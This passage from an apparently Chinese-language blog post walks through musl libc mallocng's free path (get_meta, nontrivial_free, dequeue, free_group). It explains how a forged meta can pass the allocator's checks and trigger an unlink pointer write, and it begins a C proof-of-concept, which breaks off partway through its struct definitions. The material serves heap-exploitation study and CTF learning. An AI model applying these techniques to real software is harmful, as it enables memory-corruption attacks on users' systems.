class="comment">//设置bitmap 标志</span></span><br><span class="line">    ((<span class="type">unsigned</span> <span class="type">char</span> *)p)[<span class="number">-3</span>] = <span class="number">255</span>;</span><br><span class="line">    *(<span class="type">uint16_t</span> *)((<span class="type">char</span> *)p<span class="number">-2</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (((<span class="type">uintptr_t</span>)(start<span class="number">-1</span>) ^ (<span class="type">uintptr_t</span>)end) &gt;= <span class="number">2</span>*PGSZ &amp;&amp; g-&gt;last_idx) &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> *base = start + (-(<span class="type">uintptr_t</span>)start &amp; (PGSZ<span class="number">-1</span>));</span><br><span class="line">        <span class="type">size_t</span> len = (end-base) &amp; -PGSZ;</span><br><span class="line">        <span class="keyword">if</span> (len) madvise(base, len, MADV_FREE);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">        <span class="type">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">        <span class="type">uint32_t</span> mask = freed | avail; <span class="comment">// 将释放的chunk 和 现在可用的 chunk 加起来</span></span><br><span class="line">        assert(!(mask&amp;self));</span><br><span class="line">        <span class="keyword">if</span> (!freed || mask+self==all) <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//!freed 没有被释放的chunk，mask+self==all说明释放了当前chunk所有chunk 都将被回收</span></span><br><span class="line">        <span class="comment">// 此group 会被弹出队列</span></span><br><span class="line">        <span class="keyword">if</span> (!MT)</span><br><span class="line">            g-&gt;freed_mask = freed+self;<span class="comment">// 设置free_mask 表示chunk 被释放</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    wrlock();</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);<span class="comment">// 含有meta 操作 ，内有unlink 是漏洞利用的关键</span></span><br><span class="line">    unlock();</span><br><span class="line">    <span class="keyword">if</span> (mi.len) munmap(mi.base, mi.len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="get-meta"><a href="#get-meta" class="headerlink" title="get_meta:"></a>get_meta:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(!((<span class="type">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line">    <span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *)(p - <span class="number">2</span>);<span class="comment">// 得到chunk offset</span></span><br><span class="line">    <span class="type">int</span> index = p[<span class="number">-3</span>] &amp; <span class="number">31</span>;;<span class="comment">// 得到chunk idx</span></span><br><span class="line">    <span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">        assert(!offset);</span><br><span class="line">        offset = *(<span class="type">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">        assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *)(p - UNIT*offset - UNIT);<span class="comment">// 通过offset 和chunk 地址计算出group地址</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;<span class="comment">// 从group 得到 meta 地址</span></span><br><span class="line">    assert(meta-&gt;mem == base);<span class="comment">// 检查meta 是否指向对应的group</span></span><br><span class="line">    assert(index &lt;= meta-&gt;last_idx);<span class="comment">// 检查chunk idx 是否超过 meta 最大chunk 容量</span></span><br><span class="line">    assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">    assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *)((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);<span class="comment">// 得到meta_area 地址</span></span><br><span class="line">    assert(area-&gt;check == ctx.secret);<span class="comment">// 检查 check 校验值</span></span><br><span class="line">    <span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123; <span class="comment">// 如果属于 sizeclasses 管理的chunk 大小</span></span><br><span class="line">        assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">        assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">        assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> meta *)meta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="nontrivial-free"><a href="#nontrivial-free" class="headerlink" title="nontrivial_free:"></a>nontrivial_free:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">nontrivial_free</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> i)</span><span class="comment">// i = idx</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">    <span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">    <span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;<span class="comment">//mask=已经被free的chunk +可使用的chunk</span></span><br><span class="line">    <span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g))</span><br><span class="line">    &#123;    <span class="comment">/*    </span></span><br><span class="line"><span class="comment">         如果 mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 代表此meta中group里的chunk 都被释放 或者 都被用了</span></span><br><span class="line"><span class="comment">         (2u&lt;&lt;g-&gt;last_idx)-1 计算出的值化成二进制，其中每位含义类似于bitmap，如果每位为1表每位要不是被free 不然就是被</span></span><br><span class="line"><span class="comment">         okay_to_free 检测是否可以被释放</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (g-&gt;next)</span><br><span class="line">        &#123;    <span class="comment">// 如果队列中 有下一个meta</span></span><br><span class="line">            assert(sc &lt; <span class="number">48</span>);<span class="comment">// 检测 sc 是不是mmap 分配的</span></span><br><span class="line">      <span class="comment">// 检测当前meta g 和 队列里的active[sc] meta 是否一样，一样则activate_new赋值为1</span></span><br><span class="line">            <span class="type">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">            dequeue(&amp;ctx.active[sc], g);<span class="comment">// 当前meta 出队</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment">// 在出队操作后 ,ctx.active[sc]==meta -&gt;next  是指的刚刚出队meta 的下一个meta</span></span><br><span class="line">            <span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">                activate_group(ctx.active[sc]);<span class="comment">//如果有下一个meta 直接激活 然后修改avail_mask 标志位</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> free_group(g);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!mask)</span><br><span class="line">    &#123;<span class="comment">// mask==0 group chunk 空间已被完全使用</span></span><br><span class="line">        assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">        <span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">        <span class="comment">// after last available slot was taken.</span></span><br><span class="line">        <span class="keyword">if</span> (ctx.active[sc] != g) &#123;<span class="comment">// 如果 g 未被加入 队列ctx.ative[sc]</span></span><br><span class="line">            <span class="built_in">queue</span>(&amp;ctx.active[sc], g);<span class="comment">// 把g 加入队列</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    a_or(&amp;g-&gt;freed_mask, self);<span class="comment">// 修改对应 的freed_mask 标志 ，表示着对应的chunk 已被释放</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="dequeue"><a href="#dequeue" class="headerlink" title="dequeue:"></a>dequeue:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">dequeue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">        m-&gt;prev-&gt;next = m-&gt;next; <span class="comment">// 这里存在指针互写 在 prev 所指地址上 写入next 指针</span></span><br><span class="line">        m-&gt;next-&gt;prev = m-&gt;prev; <span class="comment">// 在next 所指地址上 写入prev 指针</span></span><br><span class="line">        <span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;<span class="comment">// 队列头如果为m 那就更新为m-&gt;next</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *phead = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    m-&gt;prev = m-&gt;next = <span class="number">0</span>; <span class="comment">// 清理m(meta)的头尾指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="dequeue触发条件"><a href="#dequeue触发条件" class="headerlink" title="dequeue触发条件"></a>dequeue触发条件</h3><p>1、<code>avail_mask</code> 表示只有一个<code>chunk</code> 被使用 ,<code>freed_mask=0</code>，而<code>free</code> 刚好要<code>free</code> 一个<code>chunk</code>，满足 <code>okay_to_free()</code> 条件 就可以进入<code>dequeue</code> 进行出队操作<br>如<code>add(1,0x20)</code> 再<code>free(1)</code> 就会使得<code>meta</code> 被回收<br>2、<code>avail_mask=0</code>, <code>freed_mask</code> 表示只有 <code>1</code>个 <code>chunk</code> 没被释放，这时释放的<code>chunk</code> 就应该是那最后一个<code>chunk</code><br>如下面情况 <code>avail_mask ==0 free_mask=63=00111111 last_idx = 6</code>，已经释放<code>6</code> 个<code>chunk</code> 还有最后一个<code>chunk</code>没被释放 在释放最后一个<code>chunk</code> 时会触发<code>dequeue</code>使得对应<code>meta</code>出队<br>3、如果发现这个<code>group</code>中所有的<code>chunk</code>要么被<code>free</code>, 要么是可用的, 那么就会回收掉这个<code>group</code>，调用<code>dequeue</code>从队列中出队</p><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>free 首先会调用 <code>get_meta</code> ，而 <code>get_meta</code> 有如下检查:</p><ul><li><code>assert(!((uintptr_t) p &amp; 15));</code>，即 <code>chunk</code> 应该关于 <code>0x10</code> 对齐</li><li><code>meta-&gt;mem == base</code> ，即 <code>meta</code> 中保存的 <code>group</code> 指针要正确</li><li><code>index &lt;= meta-&gt;last_idx</code> ，即 <code>chunk</code> 的索引不能越界</li><li><code>assert(!(meta-&gt;avail_mask &amp; (1u &lt;&lt; index)));</code> ，<code>assert(!(meta-&gt;freed_mask &amp; (1u &lt;&lt; index)));</code> ，检测 <code>double fre</code></li><li><code>area-&gt;check == ctx.secret</code> ，即 <code>meta</code> 所在的 <code>meta_area</code> 的校验值正确。如果伪造的 <code>meta</code> 位于一个伪造的 <code>meta_area</code> 中，需要首先获取校验值 <code>secret</code> 并保存到 <code>meta_area</code> 开头，即这一页最开始的地方</li><li><code>offset &gt;= size_classes[meta-&gt;sizeclass]_index ，offset &lt; size_classes[meta-&gt;sizeclass]_(index+1)</code> ，这两个检查 <code>offset</code> 和 <code>chunk</code> 大小是否对应</li><li><code>assert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);</code> ，即检查 <code>offset</code> 是否越界</li></ul><p>紧接着还会调用 <code>get_nominal_size</code>，其中有对 <code>chunk</code> 的检查，总结来说 <code>chunk</code> 区域尽量都填 <code>0</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">size_t</span> <span class="title function_">get_nominal_size</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *end)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> reserved = p[<span class="number">-3</span>] &gt;&gt; <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">if</span> (reserved &gt;= <span class="number">5</span>) &#123;</span><br><span class="line">        assert(reserved == <span class="number">5</span>);</span><br><span class="line">        reserved = *(<span class="type">const</span> <span class="type">uint32_t</span> *) (end - <span class="number">4</span>);</span><br><span class="line">        assert(reserved &gt;= <span class="number">5</span>);</span><br><span class="line">        assert(!end[<span class="number">-5</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    assert(reserved &lt;= end - p);</span><br><span class="line">    assert(!*(end - reserved));</span><br><span class="line">    <span class="comment">// also check the slot&#x27;s overflow byte</span></span><br><span class="line">    assert(!*end);</span><br><span class="line">    <span class="keyword">return</span> end - reserved - p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后在 <code>free</code> 中的循环满足条件跳出循环调用 <code>nontrivial_free</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="type">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">    <span class="type">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">    <span class="type">uint32_t</span> mask = freed | avail;</span><br><span class="line">    assert(!(mask &amp; self));</span><br><span class="line">    <span class="keyword">if</span> (!freed || mask + self == all) <span class="keyword">break</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wrlock();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br></pre></td></tr></table></figure><p>进入 <code>nontrivial_free</code> 函数后会执行如下代码。<code>okay_to_free</code> 函数返回非 <code>0</code> 的前提是 <code>meta-&gt;freeable</code> 非 <code>0</code>，另外还要确保 <code>meta-&gt;sizeclass &lt; 48</code> 。之后调用 <code>dequeue</code> 函数触发 <code>unlink</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> self = <span class="number">1u</span> &lt;&lt; i;</span><br><span class="line"><span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"><span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mask + self == (<span class="number">2u</span> &lt;&lt; g-&gt;last_idx) - <span class="number">1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">    <span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">    <span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">    <span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">        assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">        <span class="type">int</span> activate_new = (ctx.active[sc] == g);</span><br><span class="line">        dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">        <span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">            activate_group(ctx.active[sc]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> free_group(g);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>之后进入 <code>free_group</code> 函数后为了减小伪造难度不再调用 <code>nontrivial_free</code> 要保证 <code>maplen</code> 不为零</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">free_group</span><span class="params">(<span class="keyword">struct</span> meta *g)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">    <span class="keyword">if</span> (sc &lt; <span class="number">48</span>) &#123;</span><br><span class="line">        ctx.usage_by_class[sc] -= g-&gt;last_idx + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (g-&gt;maplen) &#123;</span><br><span class="line">        step_seq();</span><br><span class="line">        record_seq(sc);</span><br><span class="line">        mi.base = g-&gt;mem;</span><br><span class="line">        mi.len = g-&gt;maplen * <span class="number">4096UL</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">void</span> *p = g-&gt;mem;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> get_meta(p);</span><br><span class="line">        <span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line">        g-&gt;mem-&gt;meta = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// not checking size/reserved here; it&#x27;s intentionally invalid</span></span><br><span class="line">        mi = nontrivial_free(m, idx);</span><br><span class="line">    &#125;</span><br><span class="line">    free_meta(g);</span><br><span class="line">    <span class="keyword">return</span> mi;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNIT 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IB 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_CHUNK_SIZE 0x80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_CHUNK_INDEX 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_INDEX 4</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint16_t</span> size_classes[] = &#123;</span><br><span class="line">        <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line">        <span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>,</span><br><span class="line">        <span class="number">18</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">31</span>,</span><br><span class="line">        <span class="number">36</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">63</span>,</span><br><span class="line">        <span class="number">72</span>, <span class="number">84</span>, <span class="number">102</span>, <span class="number">127</span>,</span><br><span class="line">        <span class="number">146</span>, <span class="number">170</span>, <span class="number">204</span>, <span class="number">255</span>,</span><br><span class="line">        <span class="number">292</span>, <span class="number">340</span>, <span class="number">409</span>, <span class="number">511</span>,</span><br><span class="line">        <span class="number">584</span>, <span class="number">682</span>, <span class="number">818</span>, <span class="number">1023</span>,</span><br><span class="line">        <span class="number">1169</span>, <span class="number">1364</span>, <span class="number">1637</span>, <span class="number">2047</span>,</span><br><span class="line">        <span class="number">2340</span>, <span class="number">2730</span>, <span class="number">3276</span>, <span class="number">4095</span>,</span><br><span class="line">        <span class="number">4680</span>, <span class="number">5460</span>, <span class="number">6552</span>, <span class="number">8191</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">size_to_class</span><span class="params">(<span class="type">size_t</span> n)</span> &#123;</span><br><span class="line">    n = (n + IB - <span class="number">1</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">10</span>) <span class="keyword">return</span> n;</span><br><span class="line">    n++;</span><br><span class="line">    <span class="type">int</span> i = (<span class="number">28</span> - __builtin_ctz(n)) * <span class="number">4</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; size_classes[i + <span class="number">1</span>]) i += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; size_classes[i]) i++;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> secret;</span><br><span class="line">    <span class="type">int</span> init_done;</span><br><span class="line">    <span class="type">unsigned</span> mmap_counter;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span></span><br><span class="line">    <span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span></span><br><span class="line">    <span class="type">size_t</span> usage_by_class[<span class="number">48</span>];</span><br><span class="line">    <span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">    <span class="type">uint8_t</span> seq;</span><br><span class="line">    <span class="type">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx: <span class="number">5</span>;</span><br><span class="line">    <span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line">    <span 